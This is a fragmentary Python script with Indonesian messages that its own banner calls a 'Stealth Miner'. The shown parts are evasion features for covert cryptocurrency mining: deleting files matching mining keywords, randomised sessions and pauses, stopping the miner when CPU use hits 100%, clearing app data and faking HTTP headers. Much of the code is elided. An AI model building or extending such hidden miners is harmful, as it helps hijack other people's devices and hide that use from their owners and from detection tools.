...
def clean_mining_artifacts():
    PATTERNS = [
        "cpuminer", "power2b", "rplant", "miner", "mining", "hashrate"
    ]
    TARGET_DIRS = [
                ...
                for keyword in PATTERNS:
                    if keyword in name.lower():
                        try:
                            ...
                            continue
    if deleted == 0:
        print("[ℹ️] Tidak ada file pertambangan terdeteksi.")
...
def run_one_session():
    ...
    while time.time() - start_time < duration:
        ...
        if is_cpu_100_percent():
            print(f"[⛔] CPU 100% terdeteksi! Cooldown selama {COOLDOWN_DURATION} detik...")
            proc.terminate()
            try:
...
def main_loop():
    while True:
        ...
        print(f"[⏸️] Menunggu {pause} detik sebelum sesi berikutnya...\n")
        time.sleep(pause)
...
if __name__ == "__main__":
    print("🚀  Stealth Miner: Auto-Restart + Timer Acak + No Root + Cooldown")
    clean_myapp_data()
    fake_http_headers()
